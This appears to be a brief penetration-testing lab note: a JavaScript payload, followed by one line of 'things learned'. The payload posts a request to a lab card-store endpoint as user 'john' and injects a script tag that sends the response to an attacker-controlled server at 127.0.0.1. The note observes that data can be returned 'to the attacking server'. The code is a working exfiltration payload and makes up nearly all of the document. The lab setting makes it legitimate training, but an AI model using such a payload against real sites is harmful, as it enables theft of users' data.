var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function () {
	if (this.readyState == 4 && this.status == 200){
		var test = document.createElement('script');
		test.src = 'http://127.0.0.1/test?'+this.responseText;
		document.head.appendChild(test);
	}
};
xhttp.open('post','http://pentesteracademylab.appspot.com/lab/webapp/jfp/15/cardstore?user=john',true);
xhttp.send('user=john');


things learned,

we can post something and return the data to the attacking server
